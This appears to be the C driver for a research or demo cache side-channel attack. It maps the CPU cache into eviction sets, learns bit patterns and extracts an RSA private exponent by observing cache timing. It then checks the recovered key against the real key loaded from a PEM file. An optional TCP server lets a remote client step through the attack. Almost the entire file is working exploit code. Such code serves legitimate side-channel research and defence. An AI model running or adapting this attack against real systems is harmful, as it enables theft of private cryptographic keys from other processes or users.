#include <math.h>
#include <sys/time.h>
#include <stdlib.h>
#include <time.h>
#include "sched.h"
#include <stdio.h>
#include <stdlib.h>
#include <openssl/pem.h>
#include <openssl/rsa.h>
#include <gmp.h>

///Yakir &naama
#include "EvictionSet.h"

#define ANSI_COLOR_RED     "\x1b[31m"
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_YELLOW  "\x1b[33m"
#define ANSI_COLOR_BLUE    "\x1b[34m"
#define ANSI_COLOR_MAGENTA "\x1b[35m"
#define ANSI_COLOR_CYAN    "\x1b[36m"
#define ANSI_COLOR_RESET   "\x1b[0m"

unsigned int mask1[8] = {0b01111111, 0b00111111, 0b00011111, 0b00001111, 0b00000111, 0b00000011, 0b00000001, 0b00000000};
unsigned int mask2[8] = {0b00000000, 0b10000000, 0b11000000, 0b11100000, 0b11110000, 0b11111000, 0b11111100, 0b11111110};
unsigned int mask3[8] = {0b10000000, 0b01000000, 0b00100000, 0b00010000, 0b00001000, 0b00000100, 0b00000010, 0b00000001};


char Space[60000000];
char Space1[LINES_IN_CACHE * BYTES_IN_LINE * 3];
char Space2[65000];
char Space3[256500];

#define TIMES_TO_TEST_EACH_NUM_OF_SAMPLES 1000
#define POTENTIAL_SETS 10
#define CERTFILE "cert.pem"
#define KEYFILE "privateKey.key"

#if KEYS_LEN_IN_BITS == 4096
char OnesPattern[] = {1, 1, 1, 1, 1, 1, 1};
char ZerosPattern[] = {1, 1, 0, 0, 0, 0, 0};
#else
char OnesPattern[] = {1, 1, 1, 1, 1, 1};
char ZerosPattern[] = {1, 1, 0, 0, 0, 0};
#endif

LinesBuffer Buffer;

Cache_Mapping EvictionSets;

Cache_Statistics FirstStatistics;
Cache_Statistics SecondStatistics;
Cache_Statistics DiffStatistics1, DiffStatistics2;

const char *buff_to_binary(char* x, int Len, char* Result);
char *ShiftKey(int bit, char* key);
void Load_RSA_key();
int mapping_the_cache();
void best_pattern(int SetsFound);
void best_sets(int SetsFound,int **BestSet,int **BestScore,int SetsToMonitor[SETS_IN_CACHE][2],int *SetsToMonitorNum);
int Extract_key_From_Set(int set);
int Extract_Key_From_Sets_Menu(int num_of_best_sets , int* BestSet);
int Print_Menu();

char Input[100];
#define DEMO 1
//#define NET_CONTROL 0
#ifdef NET_CONTROL
//For TCP server
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
//For Tcp Server
int socket_desc , client_sock , c , read_size;
struct sockaddr_in server , client;
char client_message[1000];
int open_socket();
#define PORT 7000
#endif

int main()
{
	int SetsToMonitor[SETS_IN_CACHE][2];
	int SetsToMonitorNum;
	int Set, SetsFound;
	int i,j;
	int res;
	int *BestSet;
	int *BestScore;
	memset(&Buffer, 0, sizeof(Buffer));
	memset(SetsToMonitor, 0, sizeof(int) * SETS_IN_CACHE*2);

	Load_RSA_key();
#ifdef NET_CONTROL
	open_socket();
#endif
	//main loop
	while(1){

		int choice =0;
#ifdef NET_CONTROL
		memset(client_message,0,sizeof(client_message));
		usleep(80000);
		strcpy(client_message,"1)Map the Cache\n2)Find Pattern\n3)Search For best sets\n4)Try to get key from set\n5)Exit\nPleaes Enter your choice:\n");
		write(client_sock,client_message,strlen(client_message));
		int read_size;
		read_size = recv(client_sock , client_message , 10 , 0);
		if(read_size == 0)
		{
			puts("Client disconnected!");
			fflush(stdout);
			close(socket_desc);
			exit(0);
		}
		else if(read_size == -1)
		{
			perror("recv failed");
		}
		printf("choose %c\n",client_message[0]);
		choice = client_message[0] - '0';

#else
		choice = Print_Menu();
#endif

		switch(choice){
		case 1:{

			SetsFound = mapping_the_cache();
#ifdef NET_CONTROL
			sprintf(client_message,"%d",SetsFound);
			write(client_sock,client_message,strlen(client_message));
#else
			printf("\nTotal Sets found: %d\r\n\n", SetsFound);
#endif
			break;
		}
		case 2:
		{
			best_pattern(SetsFound);
#ifdef NET_CONTROL
			sprintf(client_message,"0:%s,1:%s\n",ZerosPattern, OnesPattern);
			write(client_sock,client_message,strlen(client_message));
#else
			printf("'0'\t'1'\n");
			for(i=0;i<PATTERN_LEN;i++){
				printf("%d\t%d\n",ZerosPattern[i],OnesPattern[i]);
			}
#endif
			break;
		}
		case 3:
		{

			printf("'0'\t'1'\n");
			for(i=0;i<PATTERN_LEN;i++){
				printf("%d\t%d\n",ZerosPattern[i],OnesPattern[i]);
			}
			best_sets(SetsFound,&BestSet,&BestScore,SetsToMonitor,&SetsToMonitorNum);
#ifdef NET_CONTROL
			sprintf(client_message,"best sets are %d, %d, %d, %d, %d", BestSet[0], BestSet[1], BestSet[2], BestSet[3], BestSet[4]);
			write(client_sock,client_message,strlen(client_message));
#else
			printf("\nbest sets are %d, %d, %d, %d, %d\r\n\n", BestSet[0], BestSet[1], BestSet[2], BestSet[3], BestSet[4]);
#endif
			break;
		}
		case 4:{
			Extract_Key_From_Sets_Menu(POTENTIAL_SETS ,BestSet);
#ifdef NET_CONTROL
			printf("\nTotal sets found :%\r\n\n", SetsFound);
			sprintf(client_message,"%d",SetsFound);
			write(client_sock,client_message,strlen(client_message));
#else
			printf("\nTotal Sets found: %d\r\n\n", SetsFound);
#endif
			break;
		}
		case 5:{
			free(BestSet);
			free(BestScore);
			return 0;
			break;
		}
		}


	}
	printf("\r\nDone\r\n");
	return 0;
}

void Load_RSA_key(){
	int i;
	char keyFileName[20];
	sprintf(keyFileName, KEYFILE);
	FILE *fd = fopen(keyFileName, "r");
	EVP_PKEY* privkey = NULL;
	if (!PEM_read_PrivateKey(fd, &privkey, NULL, NULL))
	{
		fprintf(stderr, "Error loading RSA Private Key File.\n");
		return;
	}
	RSA* pRsa = privkey->pkey.rsa;
	char *tempkey;
	tempkey = malloc(KEYS_LEN_IN_BITS / 8);
	RsaKeys[0] = malloc(KEYS_LEN_IN_BITS / 8);
	memcpy(tempkey, (pRsa->d->d), KEYS_LEN_IN_BITS / 8);
	for (i = 0; i < KEYS_LEN_IN_BITS / 8; i++){
		RsaKeys[0][i] = tempkey[KEYS_LEN_IN_BITS / 8 - i - 1];
	}
	RsaKeys[0][KEYS_LEN_IN_BITS / 8] = 0;
	EVP_PKEY_free(privkey);
	fclose(fd);

	printf("\n\n---------------------------------- The real key is ----------------------------------\n");
	int ByteInKey;
	for(ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR) / sizeof(int); ByteInKey++)
	{
		printf("%08x", htonl(((int*)RsaKeys[0])[ByteInKey]));
	}
	printf("\n\n");

}


int mapping_the_cache(){
	if (!DEMO)
	{
		printf("\n--------------------------- Start mapping the cache ---------------------------\n");
	}
	int SetsFound = CreateEvictionSetFromBuff(&Buffer, &EvictionSets);
	printf("\nTotal Sets found: %d\r\n\n", SetsFound);
	return SetsFound;
}

void best_pattern(int SetsFound){
	printf("\n------------------------- Look For The Best Pattern Stage 1 -------------------------\n");
	unsigned int AccumScores[PATTERN_LEN + 1][PATTERN_LEN + 1], TempScore;
	int SetsWithGoodScore[PATTERN_LEN][PATTERN_LEN][SetsFound];
	memset (AccumScores, 0, sizeof(AccumScores));
	memset (SetsWithGoodScore, 0, sizeof(SetsWithGoodScore));
	char Ones[PATTERN_LEN];
	char Zeros[PATTERN_LEN];
	int Bit, OnesNum, ZerosNum,Set;
	for (Set = 0; Set < SetsFound; Set++){
		printf("rating set number %d\n\033[A", Set+1);
		TempScore = RatePatternsInSet(&EvictionSets.Sets[Set], Ones, Zeros, PATTERN_LEN, 7000, NULL, 1, AccumScores);
		OnesNum = -1;
		ZerosNum = -1;
		for (Bit = 0; Bit < PATTERN_LEN; Bit++){
			OnesNum += Ones[Bit];
			ZerosNum += Zeros[Bit];
		}
		if (TempScore){
			printf("Set_%d_%d\n",Set, AccumScores[OnesNum][ZerosNum]);
			for (Bit = 0; Bit < PATTERN_LEN; Bit++) printf("%d", Ones[Bit]);
			printf(", ");
			for (Bit = 0; Bit < PATTERN_LEN; Bit++) printf("%d", Zeros[Bit]);
			printf("\n");
		}
	}
	printf("\n\n");
	int row,col;
	TempScore = 0;
	//Best patterns method one
	for (row = 0; row < PATTERN_LEN; row++){
		for (col = 0; col < PATTERN_LEN; col++){
			printf("%10d    ", AccumScores[row][col]);
			if (AccumScores[row][col] > TempScore){
				TempScore = AccumScores[row][col];
				OnesNum = row + 1;
				ZerosNum = col + 1;
			}
		}
		printf("\n");
	}

	//Best patterns method two
	for (row = 0; row < PATTERN_LEN; row++){
		for (col = 0; col < PATTERN_LEN; col++){
			AccumScores[row][PATTERN_LEN] += AccumScores[row][col];
			AccumScores[PATTERN_LEN][col] += AccumScores[row][col];
		}
	}
	//rows
	TempScore = 0;
	for (row = 0; row < PATTERN_LEN; row++){
		if (AccumScores[row][PATTERN_LEN] > TempScore){
			TempScore = AccumScores[row][PATTERN_LEN];
			OnesNum = row + 1;
		}
	}
	TempScore = 0;
	row = OnesNum - 1;
	for (col = 0; col < PATTERN_LEN; col++){
		if (TempScore < AccumScores[row][col]){
			TempScore = AccumScores[row][col];
			ZerosNum = col + 1;
		}
	}
	int OnesNumA = OnesNum, ZerosNumA = ZerosNum;

	// columns
	TempScore = 0;
	for (col = 0; col < PATTERN_LEN; col++){
		if (AccumScores[PATTERN_LEN][col] > TempScore){
			TempScore = AccumScores[PATTERN_LEN][col];
			ZerosNum = col + 1;
		}
	}
	TempScore = 0;
	col = ZerosNum - 1;
	for (row = 0; row < PATTERN_LEN; row++){
		if (TempScore < AccumScores[row][col]){
			TempScore = AccumScores[row][col];
			OnesNum = row + 1;
		}
	}
	int OnesNumB = OnesNum, ZerosNumB = ZerosNum;
	//start scoring final 2 candidates

	memset (AccumScores, 0, sizeof(AccumScores));
	//set pattern from rows winner
	for (Bit = 0; Bit < PATTERN_LEN; Bit++){
		if (Bit < OnesNumA)
			Ones[Bit] = 1;
		else
			Ones[Bit] = 0;
		if (Bit < ZerosNumA)
			Zeros[Bit] = 1;
		else
			Zeros[Bit] = 0;
	}

	//if tie break is needed
	if (ZerosNumA != ZerosNumB || OnesNumA != OnesNumB){
		//score good sets of the rows pattern
		for (Set = 0; Set < SetsFound; Set++){
			AccumScores[OnesNumA - 1][ZerosNumA - 1] += RatePatternsInSet(&EvictionSets.Sets[SetsWithGoodScore[OnesNumA - 1][ZerosNumA - 1][Set]],
					Ones, Zeros, PATTERN_LEN, 3500, NULL, 0, NULL);
		}

		//set pattern from columns winner
		for (Bit = 0; Bit < PATTERN_LEN; Bit++){
			if (Bit < OnesNumB)
				Ones[Bit] = 1;
			else
				Ones[Bit] = 0;
			if (Bit < ZerosNumB)
				Zeros[Bit] = 1;
			else
				Zeros[Bit] = 0;
		}
		//score good sets of the columns pattern
		for (Set = 0; Set < SetsFound; Set++){
			AccumScores[OnesNumB - 1][ZerosNumB - 1] += RatePatternsInSet(&EvictionSets.Sets[SetsWithGoodScore[OnesNumB - 1][ZerosNumB - 1][Set]], 
					Ones, Zeros, PATTERN_LEN, 3500, NULL, 0, NULL);
		}

		printf("rows score: %d, columns score: %d\n", AccumScores[OnesNumA - 1][ZerosNumA - 1], 
				AccumScores[OnesNumB - 1][ZerosNumB - 1]);
		//find the best pattern between the row and column winners
		if (AccumScores[OnesNumB - 1][ZerosNumB - 1] > AccumScores[OnesNumA - 1][ZerosNumA - 1]){
			ZerosNum = ZerosNumB;
			OnesNum = OnesNumB;
		}
		else{
			ZerosNum = ZerosNumA;
			OnesNum = OnesNumA;
		}
	}

	//set the best patterns
	for (Bit = 0; Bit < PATTERN_LEN; Bit++){
		if (Bit < OnesNum)
			OnesPattern[Bit] = 1;
		else
			OnesPattern[Bit] = 0;
		if (Bit < ZerosNum)
			ZerosPattern[Bit] = 1;
		else
			ZerosPattern[Bit] = 0;
	}
	printf("the chosen patterns are: ");
	for (Bit = 0; Bit < PATTERN_LEN; Bit++) printf("%d", ZerosPattern[Bit]);
	printf(", ");
	for (Bit = 0; Bit < PATTERN_LEN; Bit++) printf("%d", OnesPattern[Bit]);
	printf("\n");

	//UNTIL HERE FIND BEST PATTERN
}


void best_sets(int SetsFound,int **BestSet,int **BestScore,int SetsToMonitor[SETS_IN_CACHE][2],int *SetsToMonitorNum_){
	int Set,i;
	printf("\n------------------------- Search for the best sets -------------------------\n");
	if(DEMO){
		//	printf("Press any key: ");

		//scanf("%s", Input);
	}
	// Now find which sets are relevant
	int SetsToMonitorNum = 0;
	for (Set = 0; Set < SetsFound; Set++)
	{
		char fname[100];
		sprintf(fname, "set_%d_samples.txt", Set);

		int TempScore = 0;
		if (EvictionSets.Sets[Set].ValidLines == 12) {

			TempScore = RatePatternsInSet(&EvictionSets.Sets[Set], OnesPattern, ZerosPattern, PATTERN_LEN,
					3500, NULL, 0, NULL);
		}

		if (TempScore > 500)
		{
			printf("                                     \rSet: %d has score %d\r\n\033[1A", Set, TempScore);

			SetsToMonitor[SetsToMonitorNum][0] = Set;
			SetsToMonitor[SetsToMonitorNum++][1] = TempScore;

		}
	}


	*BestSet = (int*)malloc(sizeof(int)*SetsToMonitorNum);
	*BestScore = (int*)malloc(sizeof(int)*SetsToMonitorNum);
	memset(*BestScore, 0, SetsToMonitorNum * sizeof(int));
	memset(*BestSet, 0, SetsToMonitorNum * sizeof(int));
	int j;
	for (Set = 0; Set < SetsToMonitorNum; Set++)
	{

		char fname[100];
		sprintf(fname, "samples/set_%d_samples.txt", SetsToMonitor[Set][0]);
		int TempScore = RatePatternsInSet(&EvictionSets.Sets[SetsToMonitor[Set][0]], OnesPattern, ZerosPattern, 
				PATTERN_LEN, 300000, fname, 0, NULL);
		printf("\n");

		printf("                                          \rSet: %d has score %d\r\n\033[1A", SetsToMonitor[Set][0], TempScore);
		if(TempScore>0){
			for (i = 0; i < POTENTIAL_SETS; i++){
				if (TempScore >= (*BestScore)[i])
				{
					for(j = (SetsToMonitorNum - 1); j > i; j--){

						(*BestScore)[j] = (*BestScore)[j-1];
						(*BestSet)[j] = (*BestSet)[j-1];
					}
					(*BestScore)[i] = TempScore;
					(*BestSet)[i] = SetsToMonitor[Set][0];
					break;
				}
			}
		}
	}

	if (DEMO){
		printf("\n%d sets to monitor", SetsToMonitorNum);
		printf("\n\n-------------------------- The best 10 sets are -------------------------\n");

		for (Set = 0; Set < (POTENTIAL_SETS + 5); Set++)
			printf("%d) set number %d with score %d\n", Set + 1, (*BestSet)[Set], (*BestScore)[Set]);
	}
	else{
		printf("\nbest sets are %d, %d, %d, %d, %d\r\n\n", (*BestSet)[0], (*BestSet)[1], (*BestSet)[2], (*BestSet)[3], (*BestSet)[4]);
	}

	*SetsToMonitorNum_=SetsToMonitorNum;
}

int Print_Menu(){
	printf("-------------------Menu----------------------------\n");
	printf("1)Map the Cache\n2)Find Pattern\n3)Search For best sets\n4)Try to get key from set\n5)Exit\nPleaes Enter your choice:\n");
	int choice;
	scanf("%d",&choice);
	return choice;
}


int Extract_Key_From_Sets_Menu(int num_of_best_sets , int* BestSet){
	int i,input =-2;
	while(1){
		#ifdef NET_CONTROL
	//		sprintf(client_message,"1)%d\n2)%d\n3)%d\n4)%d\n5)%d\n",BestSet[0], BestSet[1], BestSet[2], BestSet[3], BestSet[4]);
	//		write(client_sock, client_message ,strlen(client_message));
		printf("im here\n");
		read_size = recv(client_sock , client_message , 10 , 0);
		printf("but im not\n");
		if(read_size == 0)
		{
			puts("Client disconnected!!!");
			fflush(stdout);
			close(socket_desc);
			exit(0);
		}
		else if(read_size == -1)
		{
			perror("recv failed");
		}
		input = client_message[0] - '0';
		printf("ask to attack set %d\r\n",input);
	#else
		printf("\nbest sets are %d, %d, %d, %d, %d\r\n\n", BestSet[0], BestSet[1], BestSet[2], BestSet[3], BestSet[4]);
		printf("Best sets are:\n ");
		for (i = 0 ; i < num_of_best_sets ; i++){
			printf("%d)%d\n",i,BestSet[i]);
		}
		printf("Please Choose set or Enter -1 for exit:\n");
		scanf("%d",&input);
	#endif
		if(input == -1)
			return 0;
		Extract_key_From_Set(BestSet[input]);
	}
	return 0;
}


int Extract_key_From_Set(int set){
	int CorrectKeys = 0;
	int ByteInKey;

	int numOfSamples  = 200;
	char line[100];



	FILE *f;
	f = fopen("statistics_20-140", "wr");

	CorrectKeys = 0;
	memset(line, 0, 100);
	sprintf(line, "%d Samples\r\n:		", numOfSamples);
	fwrite(line, strlen(line), 1, f);
	int samples_found;
	char* pKey = ExtractKeyFromSet(&EvictionSets.Sets[set], OnesPattern, ZerosPattern, PATTERN_LEN, numOfSamples,RsaKeys[0],&samples_found);

	if (pKey == NULL) {
#ifdef NET_CONTROL
		sprintf(client_message,"%d ",samples_found);
		write(client_sock,client_message,strlen(client_message));
		sprintf(client_message,"-1");
		write(client_sock,client_message,strlen(client_message));
#else
		printf("Not enough samples from set %d\r\nskipping to next set\r\n\r\n", set);
#endif
		return 0;
	}

	int Equal = 1;
	if (pKey != NULL){

		Equal =  memcmp(pKey, RsaKeys[0], KEYS_LEN_IN_BITS / BITS_IN_CHAR);
	}
	else {
		printf("\033[8A");
		return 0 ;
	}

	printf("\nSet %d possible key:\r\n0x", set);

	if (Equal == 0){
		if(DEMO){
#ifdef NET_CONTROL
			sprintf(client_message,"%d ",samples_found);
			write(client_sock,client_message,strlen(client_message)); //send the number of samples found
			//write(client_sock,pKey,sizeof(pKey));//send the key
			write(client_sock,"0",1); //send the number of wrong bits
#else
			for (ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR) / sizeof(int); ByteInKey++){
				printf("%08x", htonl(((int*)pKey)[ByteInKey]));
			}
			printf("\r\n");

			printf("The key is CORRECT!\r\n\r\n");
#endif
		}
	}
	else{
		if (DEMO){
			int WrongBits = 0;
			for (ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR); ByteInKey++){
				if (RsaKeys[0][ByteInKey] != pKey[ByteInKey]) {
					int bits;

					for (bits = 0; bits < BITS_IN_CHAR; bits++) {
						WrongBits += (((RsaKeys[0][ByteInKey] ^ pKey[ByteInKey]) >> bits) & 1);
					}
					printf(ANSI_COLOR_RED "%02x" ANSI_COLOR_RESET, (unsigned char)pKey[ByteInKey]);
				} else {
					printf("%02x", (unsigned char)pKey[ByteInKey]);
				}
			}
#ifdef NET_CONTROL
			sprintf(client_message,"%d ",samples_found);
			write(client_sock,client_message,strlen(client_message)); //send the number of samples found
			//write(client_sock,pKey,sizeof(pKey));//send the key
			sprintf(client_message,"%d",WrongBits);
			write(client_sock,client_message,strlen(client_message)); //send the number of wrong bits
#else
			printf("\r\n");
			printf("The key is WRONG!\r\n");
			printf("%d out of %d bits were wrong\r\n\n", WrongBits, KEYS_LEN_IN_BITS);
#endif
			int zerosCounter = 0;
			for (ByteInKey = 511; ByteInKey >= 0; ByteInKey--){			//how many zeros?
				if (pKey[ByteInKey] == 0){
					zerosCounter++;
				}
				else {
					break;
				}
			}
		}
		else{
			printf("The key is WRONG! \r\nTry again...\n");
		}
	}
	if (pKey)
		free(pKey);

	if (CorrectKeys){
		memset(line, 0, 100);
	}
	fwrite(line, strlen(line), 1, f);
	fwrite(line, strlen(line), 1, f);
	fclose(f);
	return 0;
}



char *ShiftKey(int bit, char* key){
	char Input[100];
	char tempChar;
	int currChar, currBit;
	int charNumber = bit / 8;
	int bitNumberInChar = bit % 8;
	unsigned char tempBit = 0x01;
	unsigned char * tempKey = malloc(sizeof(char) * (KEYS_LEN_IN_BITS / 8));
	memcpy(tempKey, key, sizeof(char) * KEYS_LEN_IN_BITS / BITS_IN_CHAR); 
	for (currChar = 511; currChar > charNumber; currChar--){			//for all c
		tempChar = tempKey[currChar];					//save char so first bit wont lost after shift
		tempKey[currChar] = tempKey[currChar] << 1;				//shift left current char
		tempKey[currChar] = tempKey[currChar] | tempBit;			//add first bit of previous char
		tempBit = (tempChar & 0x80) >> 7;				//save first bit of current char	
	}

	tempChar = (tempKey[charNumber] & mask1[bit % 8]) << 1;
	tempKey[charNumber] = (tempChar | (tempKey[charNumber] & mask2[bit % 8]));

	return tempKey;
}


#ifdef NET_CONTROL
int open_socket(){
	//Create socket
	socket_desc = socket(AF_INET , SOCK_STREAM , 0);
	if (socket_desc == -1)
	{
		printf("Could not create socket");
	}
	puts("Socket created");

	//Prepare the sockaddr_in structure
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons( PORT );

	//Bind
	if( bind(socket_desc,(struct sockaddr *)&server , sizeof(server)) < 0)
	{
		//print the error message
		perror("bind failed. Error");
		exit(1);
	}
	puts("bind done");

	//Listen
	listen(socket_desc , 1);
	puts("Waiting for incoming connections...");
	c = sizeof(struct sockaddr_in);

	//accept connection from an incoming client
	client_sock = accept(socket_desc, (struct sockaddr *)&client, (socklen_t*)&c);
	if (client_sock < 0)
	{
		perror("accept failed");
		exit(1);
	}
	puts("Connection accepted");
	return 0;
}

#endif
